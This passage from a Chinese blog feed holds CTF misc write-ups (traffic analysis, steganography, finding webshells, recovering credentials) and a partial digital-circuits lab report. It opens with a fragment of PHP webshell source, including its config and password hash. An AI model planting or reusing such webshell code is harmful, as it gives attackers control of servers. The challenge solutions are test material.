punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'HTTP/1.0 404 Not Found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mtime</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$starttime</span> <span class="token operator">=</span> <span class="token variable">$mtime</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token variable">$mtime</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SA_ROOT'</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SELF'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'IS_WIN'</span><span class="token punctuation">,</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'IS_GPC'</span><span class="token punctuation">,</span> <span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dis_func</span> <span class="token operator">=</span> <span class="token function">get_cfg_var</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'IS_PHPINFO'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">eregi</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token variable">$dis_func</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token punctuation">:</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token constant">IS_GPC</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$_POST</span> <span class="token operator">=</span> <span class="token function">s_array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$P</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*===================== 程序配置 =====================*/</span><span class="token comment">//echo encode_pass('angel');exit;</span><span class="token comment">// 如果需要密码验证,请修改登陆密码,留空为不需要验证</span><span class="token variable">$pass</span>  <span class="token operator">=</span> <span class="token string single-quoted-string">'6ac45fb83b3bc355c024f5034b947dd3'</span><span class="token punctuation">;</span> <span class="token comment">//angel</span><span class="token comment">//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认</span><span class="token comment">// cookie 前缀</span><span class="token variable">$cookiepre</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">// cookie 作用域</span><span class="token variable">$cookiedomain</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">// cookie 作用路径</span><span class="token variable">$cookiepath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span><span class="token comment">// cookie 有效期</span><span class="token variable">$cookielife</span> <span class="token operator">=</span> <span class="token number">86400</span><span class="token punctuation">;</span><span class="token comment">/*===================== 配置结束 =====================*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据包中的线索</p><p><img src="https://img-blog.csdnimg.cn/20200923152500549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>大部分都是<code>TCP</code>直接找http包就行，依次追踪http流，找到其中一个带有一些奇怪的东西</p><center><img src="https://shierjinghuang.github.io/2021/10/09/Buu%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc-%E4%BA%8C/%E6%B5%81%E9%87%8F%E4%BF%A1%E6%81%AF.png" style="zoom: 33%;" /></center>传输内容好像是大段的base64秘文，盲猜是base64转图片，发现解码出来的内容是`jpg`图片格式并以自动转为图片，下载即可得到flag<img src="https://shierjinghuang.github.io/2021/10/09/Buu%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bmisc-%E4%BA%8C//from_the-x.jpg" style="zoom:50%;" /><p>27 荷兰宽带泄露</p><p>这道题，主要还是工具的使用，使用<code>RouterPassView</code>工具打开文件，搜索<code>flag</code>没有，搜索<code>username</code>出现下面两行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>Username <span class="token assign-left variable">val</span><span class="token operator">=</span>053700357621 /<span class="token operator">></span><span class="token operator">&lt;</span>Password <span class="token assign-left variable">val</span><span class="token operator">=</span><span class="token number">210265</span> /<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>username</code>的<code>val</code>值就是题目的密码，虽然我觉得这道题的提示少了一部分，应该告诉我们username是flag的。</p><p>28 MISC 来首歌吧</p><p>音频隐写，如同之前的那一题，使用stego工具打开音频文件，好家伙又是以莫斯电码进行的音频隐写。</p><pre class="line-numbers language-none"><code class="language-none">..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样的，解密得到<code>flag</code> : <code>5BC925649CB0188F52E617D70929191C</code>，套上flag就是这题的答案。</p><p>29 webshell后门</p><blockquote><p>朋友的网站被黑客上传了webshell后门，他把网站打包备份了，你能帮忙找到黑客的webshell在哪吗？(Webshell中的密码(md5)即为答案)。 注意：得到的 flag 请包上 flag{} 提交 </p></blockquote><p><img src="D:\blog\shierjinghuang\source_posts\Buu解题记录之misc-二\webshell.png" alt="1633784089948"></p><p>如上一题，下载下来，扔火绒里跑一下就能找到问题文件.以记事本打开，查找下pass就能找到flag。</p><p>30 九连环</p><p>31 被劫持的礼物</p><blockquote><p> 某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。 </p></blockquote><p>在wireshark里面进行查询，admin找到相应的http流，追踪该http流，得到</p><pre class="line-numbers language-none"><code class="language-none">name&#x3D;admina&amp;word&#x3D;adminb&amp;cooktime&#x3D;0&amp;checkcode&#x3D;5129&amp;returnurl&#x3D;http%3A%2F%2F192.168.60.123%2Findex.php%3Fr%3Ddefault%2Findex%2Findex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有题干可知，将<code>name</code>与<code>word</code>拼接，进行md5加密得到<code>flag</code> <code>&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p><p>33 snake</p><p> 用formstlrb分离，然后有一个压缩包，打开压缩包有两个文件名为key的文本一txt形式打开，得到一组base64编码。</p><blockquote><p>What is Nicki Minaj’s favorite song that refers to snakes?</p></blockquote><p><code>Nicki Minaj</code>这是谁？百度一下在百度百科上找到一个相关资料，发现其又一个代表着<code>Anaconda</code>嗯这个应该是秘钥。</p><p>通过加密方式解码得到于是我们用Serpent<a href="http://serpent.online-domain-tools.com/">工具解密</a>我们用这个然后key是Anaconda</p><blockquote><p>CTF{who_knew_serpent_cipher_existed}</p></blockquote><p><a href="https://blog.csdn.net/douqingl/article/details/50256931">关于Serpent加密的介绍</a>有时间可以去研究下这个加密方式。</p><p>34 认真你就输了</p><p>好家伙下载是一个Excel文本，有一段tip <code>The flag is under this nicely made chart. </code>做完会议一句这个确实是在下面，但是不是以文本形式打开。我们知道<code>Docx</code>，<code>Excel</code>，<code>PPT</code>都可以转化为<code>zip</code>。把文件拓展名改为<code>zip</code>在压缩包中找到，xl里面的charts文件夹，里面又一个名为<code>flag.txt</code>打开就能得到flag</p><p>35 菜刀666</p><blockquote><p>流量分析，你能找到flag吗 注意：得到的 flag 请包上 flag{} 提交 <a href="https://files.buuoj.cn/files/5847c561e29a1f87dfcd5e41badf86b4/0cd3bcfe-bd5a-47d4-9edc-60a43d58ac95.zip">0cd3bcfe-bd5a-47d4-9edc-60a43d58ac95.zip</a></p></blockquote><p><img src="D:\blog\shierjinghuang\source_posts\Buu解题记录之misc-二\tcp流7.png" alt="1633785642474"></p><p>对z1的base64编码进行解码得到<code>D:\wamp64\www\upload\6666.jpg</code>说明这里传输了一个jpg图片，</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字电路实验报告</title>
      <link href="/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p><strong>实验一</strong>  <strong>数字实验箱的使用及基本门电路的逻辑功能</strong>  </p><p><strong>一、</strong> <strong>实验目的和要求</strong></p><p>1.熟悉型数字实验箱的结构和使用方法.</p><p>2.掌握基本门电路的逻辑功能及测试方法。</p><p><strong>二、</strong>实验内容和原理</p><p>1、数字逻辑实验箱</p><p>目前数字电路的实验，通常都在数字逻辑实验箱上进行，实验箱一般包括以下几个部分组成：</p><blockquote><p>① 直流稳压电源   ② 脉冲源③ 逻辑电平显示数据电平开关 ④ BCD七段译码显示</p><p>⑤ 1C插座及自锁紧插孔       ⑥ 阻容元件区                          ⑦ 电位器组</p></blockquote><p>2、基本门电路的逻辑功能</p><p>常用基本门电路有“与”、“或”、“非”、“与非”、“或非”、“与或非”“异或”。它们的逻辑表达式及逻辑符号为：</p><blockquote><p>③ 非门<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CDA.tmp.png">    ①与门Z＝ABCD       ②或门Z＝A+B+C   ④与非门 <img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CDC.tmp.png"></p><p>⑤或非门<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CDE.tmp.png"> ⑥与非门 <img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CEF.tmp.png">        ⑦与或非门<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CF1.tmp.png"></p></blockquote><p><strong>三</strong>、<strong>操作方法和实验步骤</strong></p><p>1、数字逻辑实验箱的使用</p><p>(1)将八个电平控制开关(K1K8)的输出插孔与八个电平指示器的输入插孔(L1-L8)依次接通，当开关向上板时，输出高电平即逻辑1，开关向下扳时，输出低电平即逻辑0，板动开关观察电平指示器的L1-L8，使其输出00000000，,11110000，01010101，11111111时，观察电平指示器的指示是否与之相一致。</p><p>(2)将电平控制开关K4、K3、K2、K1的输出插孔与BCD码显示器的低位输入端D1、C1、B1、A1依次接通，将电平控制开关K8、K7、K6、K5的输出插孔与BCD码显示器的低位输入端D2、C2、B2、A2依次接通，扳动控制开关其输出为:00000000、00010001、 00100010、00110011、01010101、01100110、10001000、10011001，观察数码管显示的数字，看能否显示0-99的任意数。</p><p><strong>四、实验结果与分析</strong></p><p>2、基本门电路逻辑功能的测试</p><p>(1)或非门逻辑功能的测试</p><p>①将或非门74S27插入实验插座上。</p><p>②按图2-2接线，门的输入段3、4、5分别接逻辑开关K1、K2、K3的逻辑电平输出插孔，门的输出端6接电平指示器输入端L1，若发光二极管亮表示门的输出状态为“1”，若发光二极管不亮表示门的输出状态为“0”。门的7端接地，14端接+5V。</p><p>③使输入端(3、4、5)为表2-1情况下，分别测出输出端(6)的逻辑状态，并将结果填入表2-1中 </p><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CF3.tmp.png"> </p><table><thead><tr><th>表2-1</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>输入</td><td>输出</td><td></td><td></td></tr><tr><td>3(A)</td><td>4(B)</td><td>5(C)</td><td>6(Z)</td></tr><tr><td>0</td><td>0</td><td>0</td><td>1</td></tr><tr><td>0</td><td>0</td><td>1</td><td>0</td></tr><tr><td>0</td><td>1</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td><td>0</td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>1</td><td>1</td><td>0</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>0</td></tr></tbody></table><p>图2-2</p><p>(2)与或非门逻辑功能的测试</p><p>①将与或非门74LS51插入实验室插座上。按图2-3连接好电路。</p><p>②接通电源，按表2-2的要求进行实验。将测得的结果填入表中。</p><table><thead><tr><th>表2-2</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>输入</td><td>输出</td><td></td><td></td><td></td></tr><tr><td>2(A)</td><td>3(B)</td><td>4(C)</td><td>5(D)</td><td>6(Z)</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr><tr><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td></tr><tr><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td></tr><tr><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td></tr><tr><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td></tr><tr><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td></tr></tbody></table><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CF4.tmp.png">        </p><p>图2-3</p><p>(3)异或门逻辑功能的测试</p><p>①将异或门74LS86插入实验室插座上。按图2-4连接好电路。</p><p>②接通电源，按表2-3的要求进行实验。将测得的结果填入表中。</p><table><thead><tr><th>表2-3</th><th></th><th></th></tr></thead><tbody><tr><td>输入</td><td>输出</td><td></td></tr><tr><td>1(A)</td><td>2(B)</td><td>3(Z)</td></tr><tr><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td></tr></tbody></table><p>(4)与非门逻辑功能的测试</p><p>①将与非门74LS20插入实验室插座上。按图2-5连接好电路。</p><p>②接通电源，按表2-4的要求进行实验。将测得的结果填入表中。</p><table><thead><tr><th>表2-4</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>输入</td><td>输出</td><td></td><td></td><td></td></tr><tr><td>1(A)</td><td>2(B)</td><td>4(C)</td><td>5(D)</td><td>6(Z)</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td><td>0</td><td>1</td></tr><tr><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td></tr></tbody></table><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CF6.tmp.png"> </p><p>图2-5</p><p>(5)利用与非门组成其它逻辑门，并测试其逻辑功能</p><p>①非门</p><p>74LS20是四输入端双与非门，前面的实验只用了一个与非门，现在将另一个与非门按图2-6接成非门。接通电源，按表2-5的要求进行实验，并将测得的结果填入表中。</p><p><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CF7.tmp.png"> </p><table><thead><tr><th>表2-5</th><th></th></tr></thead><tbody><tr><td>输入</td><td>输出</td></tr><tr><td>9(A)</td><td>8(Z)</td></tr><tr><td>0</td><td>1</td></tr><tr><td>1</td><td>0</td></tr></tbody></table><p>图2-6</p><p>分析：通过芯片的内部结构来了解掌握芯片的功能以及使用方法；在连接线路以及安装芯片时不要忘了关闭电源；安装芯片时注意芯片不要安反以防烧毁芯片；开始实验前要检查线路以及指示灯能否正常工作；</p><p><strong>实验 二 组合电路的实验分析</strong>    </p><p><strong>一、实验目的</strong></p><ol><li><p>掌握组合电路的分析方法</p></li><li><p>验证半加器、全加器的逻辑功能</p></li></ol><p><strong>二、实验内容</strong></p><p>1、半加器逻辑功能测试</p><p>2、全加器逻辑功能的测试</p><p>3、四位二进制全加器逻辑功能的测试</p><p>一、 操作方法和实验步骤</p><p>（一）、半加器逻辑功能测试</p><p>   实验步骤</p><ol><li>写出S与C的逻辑表达式</li></ol><blockquote><p>S=A <code>·</code> B+ <code>A B</code> `; </p><p>C=AB`</p></blockquote><ol start="2"><li>做出逻辑电路连接图。</li></ol><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CF8.tmp.png" style="zoom: 50%;" /> <ol start="3"><li>链接电路，并验证实验结果。</li></ol><table><thead><tr><th>输入</th><th>输出</th><th></th><th></th></tr></thead><tbody><tr><td>A</td><td>B</td><td>S</td><td>C</td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td><td>0</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>1</td><td>1</td><td>0</td><td>1</td></tr></tbody></table><p>（二）、全加器逻辑功能的测试</p><p>实验步骤</p><ol><li><p>写出Sn与Cn的逻辑表达式</p></li><li><p>链接电路</p></li><li><p>链接电路并验证实验结果。</p></li></ol><table><thead><tr><th>输入</th><th>输出</th><th></th><th></th><th></th></tr></thead><tbody><tr><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3CF9.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D09.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D0A.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D0B.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D0C.tmp.png"></td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td></tr><tr><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr></tbody></table><p>（三）、 四位二进制全加器逻辑功能的测试</p><ol><li>链接电路并验证实验结果。</li></ol><table><thead><tr><th>输入</th><th>输出</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D0D.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D0E.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D0F.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D10.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D11.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D12.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D13.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D14.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D15.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D16.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D17.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D18.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D19.tmp.png"></td><td><img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D1A.tmp.png"></td></tr><tr><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>0</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><strong>三、实验结果与分析</strong></p><p>实验结果：完成了三个实验任务，对半加器，全加器，和74LS83芯片的设计和功能有更深刻的了解。</p><p>分析： 半加器只能够实现同一位上的两个数的相加，可以通过异或和与非门实现，全加器能够计算来自前一位的进位，集成的74LS83芯片可以通过级联应用实现连续多位的运算。</p><p><strong>实验  三 组合逻辑电路的设计（一）</strong>     </p><p><strong>一、实验目的</strong></p><p>掌握组合逻辑电路的设计方法，并通过实验结果验证理论知识。</p><p><strong>二、实验内容与步骤</strong></p><p>1、设计一个半减器，使之能完成两个一位二进制数<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D2B.tmp.png" alt="img">和<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D2C.tmp.png" alt="img">的减法运算（不考虑低位的借位），输出差和向高位的借位。</p><p>2、设计一个表决电路，三个输入<img src="https://shierjinghuang.github.io/2021/10/05/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/wps3D2D.tmp.png" alt="img">有两个或两个以上为1时，输出为1，否则输出为0。</p><p><strong>三、 实验结果</strong></p><blockquote><p>1、详细写明整个实验过程</p><p>2、将实验过程和实验结果叙述清楚。</p></blockquote><p>实验一：</p><p>真值表</p><table><thead><tr><th>A</th><th>B</th><th>Di</th><th>Bo</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td><td>0</td></tr></tbody></table><p>实验二:</p><p>电路图：</p><p> 